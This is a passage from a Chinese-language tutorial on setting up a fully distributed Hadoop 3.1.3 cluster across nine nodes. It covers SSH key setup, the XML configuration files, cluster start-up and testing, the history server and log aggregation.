<li>还需要在 hadoop106 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop107 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop108 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop109 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop110 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop102 上采用 root 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。（得在root的目录下进行操作）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 .ssh]$ ll</span><br><span class="line">总用量 16</span><br><span class="line">-rw-------. 1 huang huang 3573 7月   1 00:50 authorized_keys</span><br><span class="line">-rw-------. 1 huang huang 1679 7月   1 00:44 id_rsa</span><br><span class="line">-rw-r--r--. 1 huang huang  397 7月   1 00:44 id_rsa.pub</span><br><span class="line">-rw-r--r--. 1 huang huang 1670 7月   1 00:45 known_hosts</span><br></pre></td></tr></table></figure>

<ul>
<li>Known_hosts: 记录ssh访问过计算机的公钥（public key）</li>
<li>id_rsa: 生成的私钥</li>
<li>id_rsa.pub: 生成的公钥</li>
<li>authorized_keys: 存放授权过的无密码登录服务器公钥，授权过的服务器可以无密码访问本服务器</li>
</ul>
<h3 id="集群配置"><a href="#集群配置" class="headerlink" title="集群配置"></a>集群配置</h3><h4 id="集群规划"><a href="#集群规划" class="headerlink" title="集群规划"></a>集群规划</h4><ul>
<li>NameNode和SecondaryNameNode 不要安装在同一台服务器上</li>
<li>ResourceManage很消耗内存，最好不要和NameNode，SecondaryNameNode配置在同一台机器上</li>
</ul>
<p><strong>MacBook Pro(Rack1):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th align="left">hadoop102</th>
<th align="left">hadoop109</th>
<th>hadoop110</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td align="left">NameNode DataNode</td>
<td align="left">DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td align="left">NodeManager</td>
<td align="left">NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-1(Rack2):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop103</th>
<th>hadoop107</th>
<th>hadoop108</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>ResourceManager NodeManger</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-2(Rack3):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop104</th>
<th>hadoop105</th>
<th>hadoop106</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>SecondaryNameNode DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>NodeManager</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<h4 id="配置文件说明"><a href="#配置文件说明" class="headerlink" title="配置文件说明"></a>配置文件说明</h4><p>Hadoop 配置文件分两类:默认配置文件和自定义配置文件，只有用户想修改某一默认</p>
<p>配置值时，才需要修改自定义配置文件，更改相应属性值。</p>
<h5 id="默认配置文件"><a href="#默认配置文件" class="headerlink" title="默认配置文件"></a>默认配置文件</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115385.png" alt="image-20210628012641270"></p>
<h5 id="自定义配置文件"><a href="#自定义配置文件" class="headerlink" title="自定义配置文件"></a>自定义配置文件</h5><p><strong>core-site.xml</strong>、<strong>hdfs-site.xml</strong>、<strong>yarn-site.xml</strong>、<strong>mapred-site.xml</strong> 四个配置文件存放在 $HADOOP_HOME&#x2F;etc&#x2F;hadoop 这个路径上，用户可以根据项目需求重新进行修改配置。</p>
<h4 id="配置集群"><a href="#配置集群" class="headerlink" title="配置集群"></a>配置集群</h4><h5 id="核心配置文件"><a href="#核心配置文件" class="headerlink" title="核心配置文件"></a>核心配置文件</h5><p>配置core-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd $HADOOP_HOME/etc/hadoop</span><br><span class="line">[huang@hadoop102 hadoop]$ vi core-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 NameNode 的地址 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop102:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 hadoop 数据的存储目录 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/module/hadoop-3.1.3/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 配置 HDFS 网页登录使用的静态用户为 huang --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.http.staticuser.user<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>huang<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="HDFS配置文件"><a href="#HDFS配置文件" class="headerlink" title="HDFS配置文件"></a>HDFS配置文件</h5><p>配置hdfs-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi hdfs-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- nn web端访问地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:9870<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 2nn web 端访问地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.secondary.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:9868<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="YARN配置文件"><a href="#YARN配置文件" class="headerlink" title="YARN配置文件"></a>YARN配置文件</h5><p>配置yarn-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi yarn-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 MR 走 shuffle --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 ResourceManager 的地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 环境变量的继承 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.env-whitelist<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAP RED_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="MapReduce配置文件"><a href="#MapReduce配置文件" class="headerlink" title="MapReduce配置文件"></a>MapReduce配置文件</h5><p>配置mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 MapReduce 程序运行在 Yarn 上 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.app.mapreduce.am.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="集群分发"><a href="#集群分发" class="headerlink" title="集群分发"></a>集群分发</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">分发Hadoop</span></span><br><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">分发jdk</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ xsync /opt/module/jdk1.8.0_212/</span><br></pre></td></tr></table></figure>

<h4 id="去其余服务器上查看分发情况（已hadoop103为例）"><a href="#去其余服务器上查看分发情况（已hadoop103为例）" class="headerlink" title="去其余服务器上查看分发情况（已hadoop103为例）"></a>去其余服务器上查看分发情况（已hadoop103为例）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ ssh hadoop103</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br></pre></td></tr></table></figure>



<h3 id="群起集群"><a href="#群起集群" class="headerlink" title="群起集群"></a>群起集群</h3><h4 id="配置workers"><a href="#配置workers" class="headerlink" title="配置workers"></a>配置workers</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">该文件中不允许出现空格，结尾也不行</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line">hadoop105</span><br><span class="line">hadoop106</span><br><span class="line">hadoop107</span><br><span class="line">hadoop108</span><br><span class="line">hadoop109</span><br><span class="line">hadoop110</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">同步所有节点配置文件</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br></pre></td></tr></table></figure>

<h4 id="启动集群"><a href="#启动集群" class="headerlink" title="启动集群"></a>启动集群</h4><p>1.如果集群是第一次启动，需要在hadoop102节点格式化NameNode(注意:格式化 NameNode，会产生新的集群 id，导致 NameNode 和 DataNode 的集群 id 不一致，集群找不到已往数据。如果集群在运行过程中报错，需要重新格式化 NameNode 的话，<strong>一定要先停 止 NameNode 和 DataNode 进程，并且要删除所有机器的 data 和 logs 目录，然后再进行格式化</strong>。)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hdfs namenode -format</span><br></pre></td></tr></table></figure>

<p>2.启动HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sbin/start-dfs.sh</span><br></pre></td></tr></table></figure>

<p>3.在配置了ResourceManage的节点（hadoop103）启动yarn</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ssh hadoop103</span><br><span class="line">Last login: Thu Jul  1 01:56:53 2021 from hadoop110</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop103 hadoop-3.1.3]$ sbin/start-yarn.sh </span><br></pre></td></tr></table></figure>

<p>4.Web 端查看 HDFS 的 NameNode</p>
<ul>
<li><p>浏览器中输入:<a href="http://hadoop102:9870/">http://hadoop102:9870</a></p>
</li>
<li><p>查看 HDFS 上存储的数据信息</p>
</li>
</ul>
<p>5.Web 端查看 YARN 的 ResourceManager</p>
<ul>
<li><p>浏览器中输入:<a href="http://hadoop103:8088/">http://hadoop103:8088</a></p>
</li>
<li><p>查看 YARN 上运行的 Job 信息</p>
</li>
</ul>
<h4 id="集群测试"><a href="#集群测试" class="headerlink" title="集群测试"></a>集群测试</h4><h5 id="上传文件到集群"><a href="#上传文件到集群" class="headerlink" title="上传文件到集群"></a>上传文件到集群</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">小文件</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd input/</span><br><span class="line">[huang@hadoop102 wcinput]$ vi word.txt</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -mkdir /input</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -put /opt/module/hadoop-3.1.3/input/word.txt /input</span><br><span class="line"><span class="meta">#</span><span class="language-bash">大文件</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop fs -put /opt/software/jdk-8u212-linux-x64.tar.gz /</span><br><span class="line">2021-07-01 17:24:44,908 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">2021-07-01 17:25:44,619 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br></pre></td></tr></table></figure>

<h5 id="上传文件后查看文件存放在什么位置"><a href="#上传文件后查看文件存放在什么位置" class="headerlink" title="上传文件后查看文件存放在什么位置"></a>上传文件后查看文件存放在什么位置</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /opt/module/hadoop-3.1.3/data/dfs/data/current/BP-982674778-192.168.58.31-1625131269672/current/finalized/subdir0/subdir0/</span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">总用量 191948</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 7月   1 17:25 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 7月   1 17:25 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 7月   1 17:25 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 7月   1 17:25 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang       166 7月   1 17:28 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 7月   1 17:28 blk_1073741827_1003.meta</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741827</span><br><span class="line">huang huang ming ming wang</span><br><span class="line">huangmingwang</span><br><span class="line">hadoop hadoop hadoop </span><br><span class="line">mapreduce</span><br><span class="line">mapreduce</span><br><span class="line">huang</span><br><span class="line">huang</span><br><span class="line">huang</span><br><span class="line">huang</span><br><span class="line">ming</span><br><span class="line">ming</span><br><span class="line">ming</span><br><span class="line">wang</span><br><span class="line">wang wang hadoop</span><br><span class="line">hadoop hadoop hadoop </span><br></pre></td></tr></table></figure>

<h5 id="拼接文件"><a href="#拼接文件" class="headerlink" title="拼接文件"></a>拼接文件</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741825 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741826 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ tar -zxvf tmp.tar.gz </span><br><span class="line"></span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">总用量 382396</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 7月   1 17:25 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 7月   1 17:25 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 7月   1 17:25 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 7月   1 17:25 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang       166 7月   1 17:28 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 7月   1 17:28 blk_1073741827_1003.meta</span><br><span class="line">drwxr-xr-x. 7 huang huang      4096 4月   2 2019 jdk1.8.0_212</span><br><span class="line">-rw-rw-r--. 1 huang huang 195013152 7月   1 17:30 tmp.tar.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ rm -rf jdk-8u212-linux-x64.tar.gz </span><br><span class="line">[huang@hadoop102 software]$ hadoop fs -get /jdk-8u212-linux-x64.tar.gz ./</span><br><span class="line">[huang@hadoop102 software]$ ll</span><br></pre></td></tr></table></figure>

<h5 id="执行wordcount程序"><a href="#执行wordcount程序" class="headerlink" title="执行wordcount程序"></a>执行wordcount程序</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop jar $HADOOP_HOME/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br></pre></td></tr></table></figure>

<h3 id="配置历史服务器"><a href="#配置历史服务器" class="headerlink" title="配置历史服务器"></a>配置历史服务器</h3><p>1.配置 mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /opt/module/hadoop-3.1.3/etc/hadoop/</span><br><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml</span><br></pre></td></tr></table></figure>

<p>在该文件中增加如下配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 历史服务器端地址 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:10020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 历史服务器 web 端地址 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.webapp.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:19888<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.分发配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/etc/</span><br></pre></td></tr></table></figure>

<p>3.在 hadoop102 启动历史服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ mapred --daemon start historyserve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">查看是否启动</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ jps</span><br><span class="line">29072 JobHistoryServer</span><br><span class="line">29146 Jps</span><br><span class="line">16923 DataNode</span><br><span class="line">16748 NameNode</span><br><span class="line">17454 NodeManager</span><br></pre></td></tr></table></figure>

<h3 id="配置日志的聚集"><a href="#配置日志的聚集" class="headerlink" title="配置日志的聚集"></a>配置日志的聚集</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/etc/hadoop/</span><br><span class="line">[huang@hadoop102 hadoop]$ vi yarn-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 开启日志聚集功能 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation-enable<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 设置日志聚集服务器地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log.server.url<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>http://hadoop102:19888/jobhistory/logs<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 设置日志保留时间为 7 天 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation.retain-seconds<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>604800<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">分发配置</span></span><br><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/etc/hadoop/yarn-site.xml </span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启NodeManager 、ResourceManager 和 HistoryServer</span></span><br><span class="line">[huang@hadoop102 hadoop]$ myhadoop.sh stop</span><br><span class="line"> =================== 关闭 hadoop 集群 ===================</span><br><span class="line"> --------------- 关闭 historyserver ---------------</span><br><span class="line"> --------------- 关闭 yarn ---------------</span><br><span class="line">Stopping nodemanagers</span><br><span class="line">Stopping resourcemanager</span><br><span class="line"> --------------- 关闭 hdfs ---------------</span><br><span class="line">Stopping namenodes on [hadoop102]</span><br><span class="line">Stopping datanodes</span><br><span class="line">Stopping secondary namenodes [hadoop104]</span><br><span class="line">[huang@hadoop102 hadoop]$ myhadoop.sh start</span><br><span class="line"> =================== 启动 hadoop 集群 ===================</span><br><span class="line"> --------------- 启动 hdfs ---------------</span><br><span class="line">Starting namenodes on [hadoop102]</span><br><span class="line">Starting datanodes</span><br><span class="line">Starting secondary namenodes [hadoop104]</span><br><span class="line"> --------------- 启动 yarn ---------------</span><br><span class="line">Starting resourcemanager</span><br><span class="line">Starting nodemanagers</span><br><span class="line"> --------------- 启动 historyserver ---------------</span><br></pre></td></tr></table></figure>



